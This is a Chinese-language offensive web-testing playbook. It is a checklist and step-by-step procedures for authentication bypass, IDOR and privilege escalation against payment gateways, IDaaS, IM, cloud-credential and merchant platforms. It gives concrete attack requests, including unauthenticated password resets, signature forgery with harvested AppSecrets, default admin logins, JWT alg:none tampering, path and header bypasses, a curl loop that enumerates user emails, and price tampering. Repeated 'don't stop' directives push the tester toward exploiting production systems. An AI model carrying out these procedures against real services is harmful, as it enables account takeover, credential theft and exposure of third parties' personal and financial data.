□ 密文 id：JS 有公钥就自己加密相邻数字（见「密文 ID」）
□ 列表租户字段试 0 / -1 / 空（换真实他 ID 失败也试；见「哨兵租户」）
□ 有 Registry/`/v2/`：自己号打 `_catalog`，能否列出并 pull 他租户镜像（见「制品库 catalog」）
□ BaaS 匿名 session 后再 listRows，对照无 Cookie 的空表（见「匿名会话读报名表」）
□ 云开发匿名登录后再打 `lowcode-datasource` 的 `sys_user`/`wedaGetRecords`；HTTP 网关 `LOGIN_TYPE_DISABLED` 别停（见「云开发匿名用户表」）
□ 详情带 specifyUsers/openid：抄 openid 打信箱（见「详情抄 openid 再打信箱」）
□ 发布页 artifactMap 的 nodeId 打 pagechunk（见「资料库 nodeId 未授权读全文」）
□ 助手 GetHistoryList 可选头：不登录调列表/详情（见「助手历史未授权读他人任务」）
□ 前端写死 LeanCloud/supabase anon：打业务表（见「写死 appKey 打业务表」）
□ 知识列表+详情未登录出内部话术（见「未授权内部话术正文」）
□ 开放支付进件网关假签枚举 appId，活应用再换 merchantId（见「开放支付假签枚举 appId」）
□ 短信短链首页 Welcome / 302 官网 / Hello 壳别停，猜 /open /app /s/ /www 看 302 query 手机（见「短链 302 query 带手机」）
□ 未登录隐私号/虚拟号口失败时看是不是真下发真实手机，对象号可遍历（见「隐私号失败回真实号」）
□ 报名/入驻/发票抬头自动完成：不登录打 suggest（prefix）和专票/工商补全口（title）；前端标 auth 仍打（见「公司名/抬头自动完成」）
□ 入驻 H5 招商电话页：JS 查 BD 口类目空着打，不要填死数字（见「入驻 H5 空参出招商通讯录」）
□ 后台 SPA 把头 User-Id 当身份：名单只有数字号别停，把头换成这个号打当前人信息口（见「自定义身份头当会话」）
□ 浏览页/目录写访客请登录别停，同站 search（Keyword+Page）未登录也打，跟详情 URL（见「列表过滤详情不闸」第 15 步）
□ 目录请登录才能下别停，同站文件列表口+权限口 PreviewUrl 未登录也打（见「列表过滤详情不闸」第 17 步）
□ 对外搜索口 `materialType`/`tab` 改成内部类型；path 缺 v2 报 auth failed 别停（见「列表过滤详情不闸」第 9 步）
□ 入驻/审核 query 只带业务 id 出空壳时加审核状态=已通过，回包 uid 跟邮箱口（见「列表过滤详情不闸」第 10 步）
□ 文档站公开 itemList 只有对外产品别停，item 纯数字打详情/page（见「列表过滤详情不闸」第 19 步）
□ 收集表/问卷填报详情 relative 挂答卷 sheet 别停，不登录打答卷表（见「列表过滤详情不闸」第 20 步）
□ supabase anon JWT：rest 表之外打 Storage REST + x-upsert 盖官方前缀（见 file-upload STS 第 9 步）
□ Try UUIDs/GUIDs collected from your own account data
□ Test sub-resources (attachments, comments, transactions)
□ Test admin endpoints directly (BFLA)
□ Test POST/PUT body for extra fields (mass assignment)
□ Compare JSON response field count vs documented fields (hidden fields)
□ Test state/status：只改自己的单 / 能改回去的测试字段
□ 商家绑促销/券：改 productId 挂到别人的货，C 端价掉才算（见 logic-race.md §1.4）
```

---


商家绑促销/券到 SKU：只校验券归属、不校验商品归属 → 自己的券 + 别人的 productId，C 端价掉才算。正文在 logic-race.md §1.4。


---

## authbypass-authentication-flaws

打开是登录页 / SSO → 表单壳听 `../hw-rules/workflow.md` §4.1.1：找业务面；别按本文件从头跑字典 / 验证码 / 无限试密。  
发会话、重置、改绑、换票、2FA 按本文件 + `../hw-rules/workflow.md` §4.2.2 探针打，不要因为 §4.1.1 整摊跳过。表是每站下限，不是只准打这几枪。  
中间件裸默认口可一眼。滑块 / 发码 / 没进号的试密 → 转认证链，别停半截。写不写只认 `../hw-rules/report-format.md`。
英文字典/验证码 20 法/重置矩阵已砍；手法索引指针用标题搜。Host 毒重置见 `http-protocol.md`。扫码登录 CSRF 见 `csrf.md` §18。

## Authentication Bypass

### 未登录改密口

认：改密/首次设密/重置最后一步，未登录也能打到。body 常见旧密或验码字段（`old_pwd` / `sms_code` 一类）+ 新密 + 身份 id。官方页写着要短信/旧密，接口仍可能吃空串。

打：不登录。旧密/验码置空或省略，新密过复杂度。对照：填错验码应拦；不存在的身份 id 应查空。同一密再打若报「与历史密码重复」=已经写进库，不是空成功。过了立刻改回；改不回就停，不要再换别人、不要登进去。

出：未登录 Success，改掉别人的密。

假点：只回 0 没写库；必须真旧密/真短信；Success 但登录走另一套 IdP、密没跟过去。

### IDaaS 未占用密保题

认：IDaaS 忘记密码。匿名提交用户名就签发 JWT，且 `scope` 是 `_`（不是 reset）。密保题库 id 可枚举，已绑在该号上的 id 写会 409。常见 IDaaS 皮 的 path 是 `forget_password/v2/sq`，同形态换皮照打。

打：

1. 不登录 POST sq，body `{"username":"admin"}`（或存在性口先确认的号）。
2. 带 token GET question，记下已绑 id。
3. POST `update_question` 写**未占用** id 的答案（已绑 id 不要硬写）。
4. `verifyquestions?type=RESET_PASSWORD` 带自写的三道题，换 `self.password.expired.reset`。
5. `set_password`：过了立刻改回；改不回停在回包，不要把管理员密改掉留下。策略拒且密保没写上 → 半条，不按打穿进表。

出：密保答案写到别人号上（改绑），或用该令牌真改掉别人的密。

假点：sq token 直接 set_password 报 `scope is not expected`；只能写已占用题 409；verify 错答；策略拒且密保没写上。单站没中不删手法索引这行。


### 未登录培训绑定口（手法索引有指针）

认：培训 / 学院 H5 网关把账号绑定、查询 RPC 放进未登录的 client 前缀（`/spapi/v2/client/` 一类）。body 吃 C 端 uid（`mtUserId`）+ 商家号（`bAccountId`），不要 Cookie。

打（不登录）：

1. POST bind：uid 换成别人、商家号换成自编  
2. POST querybind：只带 uid 或只带商家号  

算成：出对方手机，或绑定成功改绑。

假点：只回未登录/参数异常；uid 一律未绑手机且写不进。单站没中不删手法索引这行。密钥实值、某次手机号不进库。

### 联合登录只吃 uin（手法索引有指针）

认：云活动 / 黑客松 / 伙伴门户的签发口 body 只有 `provider` + 云账号 `uin`（或同类 uid），不验 OAuth `code` / `ticket` / `id_token`。公开列表或 by-code 能问出别人的 UIN。

打（不登录）：

1. 从公开伙伴/用户列表抄 `uin` 或先打 by-code  
2. `POST` 签发口，只带 `provider` + 对方 `uin`  
3. 拿 JWT 打 `me` / 用户信息  

算成：me 是**对方** UIN，能当这个号用。只出游客空号 → 没成。

假点：必须真 OAuth code；uin 未注册直接拒；票发了但 me 仍是自己。单站没中不删手法索引这行。密钥实值、某次 JWT 不进库。

### 活动实验室 login 不校验互联票（手法索引有指针）

认：活动页 login 吃互联 `openid`+`acctype`+`access_token`，服务端**不去互联校验**这张票。对照闸：同一套参数 `acctype=wx` 或 `access_token` 留空会登陆失败；`acctype=qq`/`qc`/`pt` 加假 token 仍发票。不是空密/omit 通用枪，也不是云活动只吃 uin 那条。前端 `fx_act_helper.js` / Milo 登录助手是常见皮，没有这名仍打。

打（不登录）：

1. POST `/api/login`（活动前缀跟页面，不要只认某一条 path），`access_token` 填假值、`acctype` 填 qq（qc/pt 再各一枪），`openid` 填可枚举号  
2. 拿 JWT 打 getRoles（按区服）/ bindRole 一类角色口。对照：不带头应要登录；wx/空票应失败  
3. 角色列表空别当没洞，换区服、换邻号；绑口跟到能绑上再停。过了能改回的改回  

算成：票里是对方 openid，角色列表出现他名下角色名/`charac_no`，或能绑上。

假点：只签发空号且角色列表全空、绑不上游戏角色；必须真互联票。密钥实值、某次 JWT 不进库。单站没中不删手法索引这行。

### 运营配置深链里的会话票（手法索引有指针）

认：未登录就能打的首页/运营配置 JSON，banner 跳转 URL（skipPath / jumpUrl / schema）query 里带着 `token` / `apptoken` / `access_token` 这类能当会话的串。对照闸：不带这串打 me 应登录过期。

打（不登录）：

1. 抄配置里整段跳转 URL，把 query 里的票放到 Token / Authorization 头  
2. 打 me / user info / 钱包  
3. 对照：同一口不带这串应过期  

算成：me 是别人的手机/角色，会话能当这个号用。

假点：票过期或占位串登不进去；配置只出运营文案没有票。密钥实值不进库。单站没中不删手法索引这行。

### 验签失败 302 回显算出的签（手法索引有指针）

认：支付/开放网关信封有 `sign_data`/`sign` + 商户号。假签时 **GET / DELETE / OPTIONS / HEAD 都可能 302**，Location 或 `msg` 里带服务端刚算的合法签（`calculateSign is:` 一类）。有的网关 GET 只 HTML/ILLEGAL_SIGN，换 METHOD 才漏；有的网关 **GET 自己就会 302 漏签**，不要只认 DELETE/OPTIONS。

打（不登录）：

1. 假签打签约/下单口，**GET 先看 Location** 有没有 `calculateSign`  
2. GET 没带签再换 DELETE/OPTIONS/HEAD，从 Location URL 解码抄签  
3. 填回 `sign_data` 打查询/订单。对照：假签仍失败，真签出他商户单  

算成：过签查出**他商户**未公开订单/账户正文（金额、关单原因、卡种）。

假点：所有 METHOD 都只报验签失败、没有算出的签；抄回去仍拒签。密钥实值不进库。单站没中不删手法索引这行。

### 身份供应商代调报错回显 token（手法索引有指针）

认：业务口帮前端调身份供应商。常见三皮：① 小程序码/跳转码口，`path`/`page`/`pagepath` 你能填，非法页时 message **原样带回** `access_token=`；② QQ/OAuth 换票口把 `client_secret` 拼进上游 URL，`redirect_uri` 改外域让下游 HTTP 5xx，报错 URL 把 `client_secret=` 吐给前端；③ 未登录业务口 `GET /api/business/access-token`（或同类领票 path）直接 200 出票，不必等报错回显。假码打本域回调往往只回业务错码、不带钥，**别停**。清单里有领票口，别只打签发码口。

打（不登录）：

1. 清单有领票口先 GET，200 且 `data` 是 `access_token` 就当已经抄到，不必再走非法 pagepath  
2. 没有领票口：path 填外站或明显非法页；换票口先假码+本域 `redirect_uri` 对照  
3. 换票口再把 `redirect_uri` 改外域，从报错 URL/message 抄 `access_token=` 或 `client_secret=`  
4. 身份票打 `身份供应商 API/cgi-bin/account/getaccountbasicinfo`，再 `/wxa/generatescheme`；QQ AppSecret 拿授权码换该应用 access_token / 打本站换票  

算成：能问出官方号主体/appid，或签发官方正式跳转码；或完整 AppSecret 能换成该应用 access_token。

假点：报错只有 ErrCode 没有 token/secret；假码本域回调不带钥；token 调身份接口无效；secret 换不了票。密钥实值不进库。单站没中不删手法索引这行。

### 开通页 RPC 下发 signKey（手法索引有指针）

认：支付 UISDK/开通页。未登录打配置或 thrift 口，body 只有可枚举 `appId`。死应用 `APP_NOT_FOUND` 且无钥，活应用回完整 `signKey`/`signMethod`。不是文档/webpack 写死（那枪见下一节）。

打（不登录）：

1. 换 `appId`。对照死号应无钥  
2. 抄活号 `signKey`，按回的 `signMethod`（常见 MD5，参按字典序拼 `&key=`）现签  
3. 打支付查询。对照假钥 `SIGN_ERROR`，真钥过签  
4. 过签别停在查询。打改结算卡 `change/card`：支行号差分出 `changeId`，原值报未变更才算写上。SUCCESS 但 `changeId=null` / 费率没变不算。过了立刻改回  

算成：完整 AppSecret 且真钥过生产验签；或查出他商户身份证/卡/挂单；或建出虚拟门店 poiId；或改掉他商户结算卡/开户行（`changeId` 有值）。

假点：回的是占位钥过不了验签；死活都 `APP_NOT_FOUND` 且无钥。密钥实值不进库。单站没中不删手法索引这行。

### 调试文档写死 AppSecret（手法索引有指针）

认：文档 / Demo / 官方包 / 接入 HTML / npm 历史包写死**完整** AppSecret（appId+appSecret、signKey、商户 pfx、SDK 钥），不是 `your-secret` / `YOUR_ACCESS_KEY` 占位。**wiki 把钥打成星号，同一套官方 zip / Demo / HTML 示例仍明文，别停。npm 旧版别当下架。** 常见皮：调试指南 `config.js`、FAQ 链到的 GitHub `properties`、文档操作截图 PNG、SDK zip 里 `prod/config.properties` / Demo Java `baseInfo`、接入 HTML 的 `MSDKConfig.json`、公网 npm `index.js`。旁边有换票口或按文档现签的生产口。算法在下面打哪，不钉某一家产品。

打（不登录）：

1. 从文档、FAQ 链过去的 GitHub、**或文档页操作截图**抄 appId/accessKey、appSecret/secretKey（实值只进报告，不进本库）。截图 OCR/看图即可，别停在 config.js
1b. 企业 IM/开放通讯录：换票后 `user/get` 或 `user/list` 的 mobile 是空串**别停**，打 `linkedcorp/user/get`（body `userid`）。对照通讯录口无手机、互联企业口出 11 位手机才算升链
2. 换票口：code 填假串。对照：secret 改成等长假值应「业务参数非法」；真密钥变成「授权码过期/无效 code」。本站没有 `/proxy`、换票口在另一棵业务域不打时，同产品独立 oauth `/oauth/v2/token` 直接 POST `grant_type=client_credentials`（对照假钥 `invalid_client`）
3. 分销/开放查询口：按文档 HMAC（key 小写字典序拼接，有 `test=test` 一类联调参就带上）。对照：假 secret 签名失败，真钥出该应用下的供给名单
4. 官方 CLI 改调试包/正式包口（`package/changeDebugVersion`、`changeVersion` 一类）。对照：假钥「密钥错误」，真钥过鉴权变成「游戏包资源不存在」也算钥活了，不要停在没上传真包。**改包口不要只打 upload/换版本**，WASM 分包 `packageBind` / `build` / `queryBuildResult` 也打；假钥密钥错误、真钥能绑到该应用名下算出写上
5. 网关写了服务器 IP 白名单：试 `X-Forwarded-For: 127.0.0.1`。无头应无权，加上后真钥出供给
6. 供给查询过签后别停在名单：打下单前校验（check），回真卖价/结算价再 booking。对照假钥签名失败。下出订单号立刻取消；改不回停在回包，禁止批量真下
7. GitHub/SDK 公开演示 RSA+3DES：生产 XML pay-gate 仍认时，现签 `POST /service/query` 解开返回密文。对照假钥验签失败。邻号共用同一把演示 RSA 时回业务错（订单号有误）不是验签失败，钥仍活。禁止真下单/退款
8. 开放文档对象存储超长预签名 SDK zip：解开 `prod/config.properties`（及国密配置）+ pfx，用配置密码开证书，抄商户号/signKey 打**生产查单**。对照假钥 SIGN_ERROR。只查单，禁止真转账
9. 游戏 MSDK：wiki encode=2 时 `sig=md5(msdkKey+timestamp)`（不绑 path/body、无时间窗）现签生产/测试 `/auth/*`。对照假签 `sig error`；真签过闸转到身份供应商 `access_token expired` / 手Q `0x711` 一类业务错也算钥活，别当没洞。V3 `/auth/guest_register`：`reqid` 明文 uuid 会 `decrypt faild`，用 msdkKey **前 16 个 ASCII** 做 QQ TEA（16 轮大端 `oi_symmetry_encrypt2`）再 hex；开出 guestid 再打 `/auth/guest_check_token`。没有玩家有效社交 token 就停，禁止为进号磨登录
10. 官方接入 HTML 示例 `MSDKConfig.json` 明文 `MSDK_SDK_KEY`：`source=0` 时 `sig=md5(path+"?"+除 sig 外字典序 query+body+钥)`；decrypt 用 `md5(ts+密文+钥)`（文档示例 ts/密文/签能对上再拿到生产打）。对照假签 `invalid sig`；真签过闸后打游客登录，`channel_info` 只放自编 uuid 仍签发 openid/token/jwt 就算用户票。禁止为进别人号磨渠道 code
11. npm 历史包写死 `developerId`+`signKey`：合作中心网关假签活号回「签名错误」、死号回「开发者数据异常」，可枚举活号。真签 `sign=SHA1(signKey+按 key 排序的 key+value)`。隐私号批量拉取口不带门店 `appAuthToken` 也能 `OP_SUCCESS`；换票口真签过闸转到「入驻状态不正确」也算钥活。空数组不是假点（当前没降级单）。**别停**：同套更高版本 npm 把 `appAuthToken` 写死别当联调丢掉，带令牌现签 `queryPoiInfo`，换 `ePoiId` 出他商户店名+11 位手机。禁止真下单/磨授权码
12. 充值/企业支付 Demo HTML（`enterprise_client` 一类）输入框写死 AppId+AppKey：别当联调占位。不登录抄出来，HMAC-SHA1 源串 `GET&urlencode(path)&urlencode(按 key 排序的 kv)`，密钥 `AppKey+'&'`，Base64 得 sig。对照假签 `sig error`。真签打生产 `/v1/r/{appid}/open_order` 出 `token_id`。只下未支付单，禁止走收银台付款/退款。实值只进报告
13. 登录页 JS 把钉钉 ISV `suiteKey`+`suiteSecret` 写成 `clientId`/`clientSecret`（值 `suited` 开头）：别当 OAuth 占位。不登录 POST `https://oapi.dingtalk.com/service/get_suite_token`，`suite_ticket` 填假值。对照假 secret 回「不合法的套件key或secret」。真钥出 `suite_access_token`。实值只进报告
14. 控制台 webpack/Vuex 默认地图 key 别当占位。假钥对照后不要只打逆地理：打地点云/图层 `table/list`，有表再 `data/list`。只逆地理通、表是空的 → 假点。实值只进报告
15. 官方文档/接入 HTML 示例 curl 写死 Gamekey：别当占位。不登录抄 AppID+Gamekey，`sign=md5(mod,func,appid,time,postdata,key)` 现签生产排队网关 `getZoneListCount`。对照假钥 `req sign error`。真签 `ret=0` 出区服在线。只查排队/在线，禁止往队列插人、禁止把人退出排队。实值只进报告

算成：钥是活的，能换成该应用的用户票，或业务查询出该应用下的供给名单，或给该应用绑上 WASM 分包版本，或 booking 下出该应用订单号，或解开**他商户**未公开支付订单持卡人；或假签验签失败、真签过生产闸转到下游身份供应商业务错（证明生产仍认这把完整钥）；或生产 `open_order` 出未支付 `token_id`；或钉钉 `get_suite_token` 出 `suite_access_token`；或生产排队 `getZoneListCount` `ret=0` 出区服在线。

假点：文档是占位符；真假密钥同一句错；钥过期调不通；联调钥只能打测试环境、生产拒；wiki 打码就当 zip/Demo 也打码。密钥实值不进库。单站没中不删手法索引这行。

### 门户 CMS 写死站点钥（手法索引有指针）

认：门户/开放平台前端（不是调试文档 zip）写死 门户 CMS 的 `accessKey`+`secretKey`。有 `GET /api/v1/cms/login`，回 JWT，头名常见 `cms-token`。首页可能只是 CMS 欢迎页，钥在另一个门户 JS 里。

打（不登录）：

1. 抄 AK/SK 打 login（实值只进报告）
2. 带票打 `channel/list`、`content/list|detail|search`、`attachment/list`
3. 不要停在官网轮播频道。跟开发者/测试/后台频道，GET `attachments.url`

算成：内部测试报告/未对公开展示频道的稿件正文（xlsx 表字段也算）。

假点：只有公开运营 Banner/客户端下载地址。密钥实值不进库。单站没中不删手法索引这行。

### 发签 nonce 是私钥（手法索引有指针）

认：企业 IM/业务 **unlogin** 发签口（`queryAppSignature` / `queryCorpSignature` 一类）。其它业务口请登录，这条不要 Cookie。回包 `nonceStr`/`nonce` 以 `MIIE` 或 `-----BEGIN` 开头，能当 PKCS8 私钥 load。常见前面还有未登录渠道/活码口漏 `corpId`。

打（不登录）：

1. 未登录渠道/活码漏 `corpId` 就抄  
2. POST 发签口带 url + corpId  
3. 把 `nonceStr` 当私钥 load（Python `load_der_private_key` / openssl）。对照：假 corpId 应业务错、没有 PEM  

算成：能 load 成 RSA 私钥。

假点：nonce 只是短随机串；假 corpId 一直业务错。密钥实值不进库。单站没中不删手法索引这行。

### 未登录发 IM/体验票（手法索引有指针）

认：未登录 `im/getConfig` 下发 TIM `userSig` 且 `identifier=null`；或云产品体验中心/apaas 发签口按请求里的**已有 userId** 发票（对照游客 `none_auth` 会新开号）；或同一后台其它业务口请登录，发签口只要自定义 trace 头 + 客户端传入的 userId 就发 IM/RTC userSig；或自建 IM 网关发签口只吃 appkey，票里没 userId，接入口 body 的 uId 才是身份；或 JS 写的 v2 inner 发签被 IP 白名单；或官方音视频/IM Web Demo 前端写死发签口和固定 pwd，identifier 跟请求走，空密也给已有用户发票。

打（不登录）：用该 sig 登 `IM 接入域`：`openim/login`、`getmsg`、`friend_get`、`get_joined_group_list`、群资料/消息。体验页再打 login_token 看 `data.phone`。对照闸：其它业务口应请登录；发签口只加 trace 头、userId 换成 interviewer_/candidate_ 一类；拿 authorization/signature 打群历史/进房。匿名 appkey 发票后，access/get 把 uId 换成 interviewer_/admin，看回包 userID。v2 `by_app_name` 回 IP not allowed **别停**，改打 v3 同 path，只要 `appName`。官方 Demo：抄 JS 里的 UserSigService URL 和 pwd，identifier 填已有用户编号；pwd 空串再打一枪。拿 userSig 打 friend_get，对照游客空号。

算成：拉到**他人**会话/群成员/好友，或明文手机。

假点：只能登游客 `null`、空会话、只有自己建的空群；换别人 UserID=70013；`none_auth` 只新开空号；演示号没绑手机不算。单站没中不删手法索引这行。

### 写死产品号发共享 JWT（手法索引有指针）

认：AIGC/小工具 H5 或落地页把产品号 / `qbid` 写死在脚本里。发签口（`account/qb` 一类）不登录就给**共享产品号** JWT，票里 name 是产品名不是游客。JS 往往只有 create / GET by id，没有 list。

打（不登录）：

1. 抄页面写死的产品号打发签口  
2. 带着票 POST 同源 `.../task/list`（或 workflow/history 一类 JS 没写的 list）。对照：不带票应未登录；空包 list 仍出 total  
3. 跟 `userImages` / 原图 CDN，确认真下到人脸/证件照  

算成：list total 海量且带**他人**原图/证件照。

假点：票只能建空任务；list total=0 或只有自己刚传的。密钥实值、某次 JWT 不进库。单站没中不删手法索引这行。

### 官方客服链签发外站（手法索引有指针）

认：企业客服 H5 签发链；内联有 `getXcxLink`/`get_wx_open_link`。不是通用跳转页。

打（不登录）：POST `queryStr=caUrl=外站&urlType=2`。打开返回的 `客服落地链`。

算成：落地页正式名是官方客服号，`base64Decode` 出的 query 是你填的网址。

假点：只签发本站 `/ca/`；落地页不带 query；必须登录。单站没中不删手法索引这行。

### 演示号领云钥（手法索引有指针）

认：云厂商产品 Demo / 体验页 / 控制台代理 / 供应商后台；领 STS、联合身份、建任务只要业务 id 或空 body，不要 Cookie。领 STS 口缺参只报字段校验不是登录闸，不一定有演示号。不是对象存储 STS 通配覆盖（那枪见 `file-upload.md`）。

打（不登录）：有演示号抄客户编号再打领钥 / 建任务 / 联合身份。没有演示号也打领钥口：缺参报字段校验别当登录闸。空 body 报缺 `AppId`/`Uin` 也别当没口，带能解析的数字 Uin 就可能发联邦 STS；bucket+file_name 仍打。领钥口可能在独立 demo CDN 的 `/openapi/`（页面 JS 跟过去）。分享域前端 HMAC 过网关后，对照其它口「token 不合法 / Token校验失败」，`/share/token/info` 一类领 STS 口不带分享页 token 仍打。换 bucket 用 PUT/NoSuchBucket 探活桶。钥拿去 GetCallerIdentity 对主账号；有启动、检索一类 Action 再签（余量不够别停，看能不能问出账号或出账单）。Epaas 过 HMAC `SC-SIGN` 后对照名单仍 UserNotLogin，专找 GetUploadURL/FileName 不校验 token（过签≠出数）。

算成：临时钥匙能问出 AccountId/角色名；同一身份下列表出现刚建的任务；或检索出口径出账单/实例/他主体业务字段；或活桶 PUT 200。

假点：钥匙调业务 API 全 Unauthorized；领钥口请登录/401；create 200 但列表没有。没有演示号/客户编号不是假点。单站没中不删手法索引这行。密钥实值不进库。

### 未登录签发合作方登录链（手法索引有指针）

认：电子合同 / 供应商门户人打开是登录页，框里只填可枚举合作方数字 id（partnerId / supplierId 一类），没有密码。未登录 `getUrl`（或同类签发登录链）直接回 `partnerId`+`generate`+`code`。旁边有 `setCookies` / 换票口吃这三项下会话。

打（不登录）：

1. 登录页 JS 抄签发口，合作方 id 用页上提示的数字或邻号  
2. 把回包三项 POST 给 setCookies / 换票口，抄 Set-Cookie  
3. 带会话打合同列表 / 支付进件 / 身份口。对照：不带 Cookie 应未登录；不存在的合作方 id 应查空  

算成：身份口登录成功，或能当这个号读未公开合同。

假点：签发口要已登录；code 必须从邮件点开；setCookies 不下会话；只出公开招商页。单站没中不删手法索引这行。密钥实值、某次 Cookie 不进库。

### 未登录合作方直连配置查询（手法索引有指针）

认：运营台 / 供应链前端把供应商直连配置查询挂成未登录。body 只有可枚举合作方数字 id（partnerId 一类），不要 Cookie。回包 `partnerInfos`（或同类）里带 clientId+clientSecret。

打（不登录）：

1. 运营台 JS 抄查询口（getV2 / tech/partner 一类）
2. partnerId 用邻号。对照：未配置的 id 应回查空/未配置，不是登录闸
3. 算出是完整 clientSecret，不是空成功码

算成：回包里是完整 clientId+clientSecret，能当这把直连钥用。

假点：接口已下线；clientSecret 空或占位；必须登录；只出公司名没有钥。单站没中不删手法索引这行。密钥实值不进库。

### 未登录签发回跳外域（手法索引有指针）

认：未登录签发 SSO / 回跳；callback 只判断字符串里有没有官方 host，或不校验、任意外域也能签。

打（不登录）：callback/redirect 填外域：夹官方 host（query/子域/userinfo）和**不夹**都试。回包有票/签再交给自家 SSO。通行证页看会不会 `location.replace(回跳+"?"+token名+"="+session)`。对照：不含官方字应被改空或拦。必须真机登录才出票且前端不会把 token 拼进回跳 → 半条，停在签单，不算打穿。

算成：SSO 成功且回跳仍是外域；或登完通行证出现在外域 query。

假点：callback 被改空；SSO 缺回调参数。单站没中不删手法索引这行。

### 缺参字段改头换票（手法索引有指针）

认：未登录业务口 JSON 报「缺少 xxx」；query/body 带了仍报缺少。或 Spring 400 HTML/`message` 写 `Required String parameter 'os' is not present` 一类，点名的是 **Cookie 名** 不是 query。

打：把这个字段放到 **HTTP 头**再打 SSO/换票/login。头没吃别停，改打 Cookie（设备 `uuid`/`os`/`platform` 一类自己编）。未登录写口（绑店/改状态）同样试，不要只打换票。对照：只放 query 应仍报缺少。

算成：出别人的登录票/姓名；或写上他人门店/对象。

假点：query 有该字段仍报缺少（头和 Cookie 都没吃）不算过；只出自己的票。单站没中不删手法索引这行。

### SSO 壳后面的账密登录口（手法索引有指针）

认：管理后台人打开只跳 SSO / 统一认证，页面没有账密框；后端仍暴露账密登录 API。别把 SSO 壳当成整摊没登录口。常见后台骨架 `/admin-api/system/auth/login` 是常见皮，没有这名仍打。

打（不登录）：

1. POST `/admin-api/system/auth/login`，body `{"username":"admin","password":"123456"}`（不要去磨 SSO 验证码）
2. 把 `data.accessToken` 放到 `Authorization: Bearer` 打 `/admin-api/system/tenant/page` 或 `/system/user/page`
3. 对照：错密应失败；默认口出 `userId=1` 一类平台票

算成：进了平台管理员号，且租户/用户列表出他人手机/姓名。

假点：登录口 404 或默认口已改；票只能进空租户没有联系人。密钥实值、某次 Token 不进库。单站没中不删手法索引这行。

### 刷新票空包发管理员票（手法索引有指针）

认：JSON 网关有刷新票口（`/api/auth/refresh` 一类）。不登录、空包 `{}` 就发票，票里身份是 `admin`（不是游客）。管理后台和前台走同一套云开发/网关。

打（不登录）：POST 刷新口；把 `data.token` 放到 `Authorization: Bearer` 打 `/api/admin/me/permissions` 和申请/用户名单。对照：不带这张票应未登录。

算成：me 是超级管理员（权限 `*`），或名单出现**他人**手机/姓名。

假点：只出游客/过期票；refresh 必须带旧 refresh token；me 仍是自己。密钥实值不进库。单站没中不删手法索引这行。

### 空 openId 进已有号（手法索引有指针）

认：小程序 / H5 的 GET 登录口吃 `openId`（`loginByOpenId` 一类）。缺参报缺字段，假 openId 登录失败，空串仍 200 出**已有商家号**和手机，不是游客空号。

打（不登录）：

1. 缺参一枪，确认这是登录口  
2. 假值一枪，应失败  
3. `openId=` 空串再打；GET query 没吃再试 POST JSON `{"openId":""}`  
4. 对照：空串出的店名/登录手机，和假值失败、缺参报缺，不是同一套游客号  

算成：进已有商家号且出手机（能当这个号用）。

假点：空串只出游客空号。密钥实值、某次 Cookie 不进库。单站没中不删手法索引这行。



---

## 补充与进阶

## 越权与逻辑漏洞实战参考
- 竞争条件绕过业务逻辑 → `logic-race.md`

> 分类: IDOR → 垂直越权 → 水平越权 → 支付逻辑 → 密码重置 → 会话管理 → API鉴权

> **last_updated**: 2026-06-04 | **tested_against**: JWT, OAuth 2.0, Session, REST API
---

---

## 1. IDOR (不安全的直接对象引用)

---

### 1.1 检测方法

```
典型场景:
- /api/user/123/profile          → 改 123 为 124
- /invoice?id=INV-2024-0001      → 递增/递减ID
- /download?file=report_123.pdf  → 改成其他文件名
- /api/order/456/detail          → 遍历订单号

检测步骤:
1. 用账户A登录, 访问自己的资源, 记录请求
2. 用账户B登录, 执行同样操作, 对比两组的ID/Token模式
3. 用账户A的Cookie/Token, 请求账户B的资源ID
4. 如果有加密的ID (hash/token) → 尝试解码/猜测生成算法
```

---

### 1.2 IDOR 常见参数名

```
id= / uid= / user_id= / userId=
order_id= / invoice_id= / transaction_id=
file= / file_id= / document_id=
profile= / account= / customer=
uuid= / guid= / hash=
```

---

### 1.3 利用

```bash

---

# === 基础遍历 ===
for i in $(seq 1 100); do
  curl -s -H "Cookie: session=xxx" "https://target.com/api/user/$i/profile" | grep email
done

---

# === UUID 枚举 (如果是可预测的UUIDv1/v3) ===

---

# UUIDv1 含 MAC 地址 + 时间戳 → 可枚举

---

# 工具: https://github.com/ramsey/uuid (分析UUID版本)

---

# === 批量检测 ===

---

# Burp Intruder: 数字/日期/GUID payload → 按响应长度分类
```

---

---

## 2. 垂直越权 (权限提升)

---

### 2.1 检测点

```
普通用户访问管理功能:
- /admin /administrator /manage /dashboard
- /api/admin/users
- /api/config
- /actuator (Spring Boot)

未登录访问需认证的接口:
- 直接访问 → 看是否返回 401/403
- 删除/修改 Cookie/Token → 看是否有校验
```

---

### 2.2 绕过技巧

```bash

---

# === 路径变形 ===
/admin/users → /Admin/users → /admin/Users
/admin → /ADMIN → /%61dmin
/admin/../admin/users → //admin/users
/admin;/users → /admin/users/

---

# === HTTP 方法绕过 ===
GET  /admin/users    → 403 Forbidden
POST /admin/users    → 200 OK
PUT  /admin/users    → 200 OK
PATCH /admin/users   → 200 OK

---

# === Header 绕过 ===
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-HTTP-Method-Override: GET
X-Forwarded-For: 127.0.0.1

---

# === 角色参数 ===
GET /api/user/profile?role=admin
PATCH /api/user/123 {"role":"admin"}
POST /api/register {"username":"test","role":"admin"}
```

---

### 2.3 JWT 角色篡改

```bash

---

# JWT payload 含角色:
{"sub":"user123","role":"user"}

---

# 尝试:
1. 改为 {"sub":"user123","role":"admin"} → 不验签? → 直接越权
2. algorithm: none 攻击:
   {"alg":"none","typ":"JWT"}
   # Header + Payload Base64后, Signature留空
3. 密钥爆破 (HS256弱密钥) → 用 jwt_tool / hashcat
```

---

---

## 3. 水平越权 (跨用户)

---

### 3.1 检测

```

---

# 账户A的Cookie, 访问账户B的资源
curl -H "Authorization: Bearer <TOKEN_A>" "https://target.com/api/user/B_ID/profile"
curl -H "Cookie: session=<SESSION_A>" "https://target.com/api/orders?user_id=B_ID"
```

---

### 3.2 常见模式

```bash

---

# === GUID/UUID 不可预测 → 盲猜/从其他接口泄露 ===

---

# 用户ID从 /api/user/profile 返回 → 改ID访问 /api/user/{id}/orders

---

# === ID 有规律 ===

---

# MD5(email) → 计算目标的 email hash → 访问

---

# === 批量利用 ===

---

# 用搜索引擎/其他公开页面收集ID → 批量访问敏感接口
```

---

---

## 4. 支付/交易逻辑漏洞

---

### 4.1 金额篡改

```http
POST /api/checkout HTTP/1.1

---

# 原始:
{"product_id":123,"quantity":1,"price":99.99}

---

# 尝试:
{"product_id":123,"quantity":1,"price":0.01}       # 改价格
